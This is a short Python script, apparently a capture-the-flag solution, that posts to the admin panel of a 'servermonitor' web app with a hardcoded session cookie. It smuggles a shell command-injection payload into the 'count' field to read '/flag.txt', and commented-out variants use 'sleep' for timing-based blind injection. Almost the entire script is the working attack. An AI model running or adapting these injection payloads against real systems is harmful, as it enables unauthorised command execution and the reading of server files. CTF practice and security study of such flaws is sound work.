import requests

url = 'https://movie-review.abdulhaq.me/servermonitor/admin_panel'

headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,en-IN;q=0.8',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'cookie': 'session=eyJsb2dnZWRfaW4iOnRydWV9.Zv7xBg.jM-QbRd9tbM0fbVvxZWiOkL0o3k',
    'origin': 'https://movie-review.abdulhaq.me',
    'priority': 'u=0, i',
    'referer': 'https://movie-review.abdulhaq.me/servermonitor/admin_panel',
    'sec-ch-ua': '"Microsoft Edge";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0'
}

data = {
    'ip': '143.110.250.149',
    'count': '1 127.0.0.1 && $(cat /flag.txt) || ping || echo'
    # 'count': '1 127.0.0.1 && $(cat /flag.txt) || sleep 60 ||echo'
}

response = requests.post(url, headers=headers, data=data)
# payloads = ['1 127.0.0.1 && $(cat /flag.txt) || sleep 10 || echo']
print(response.text)
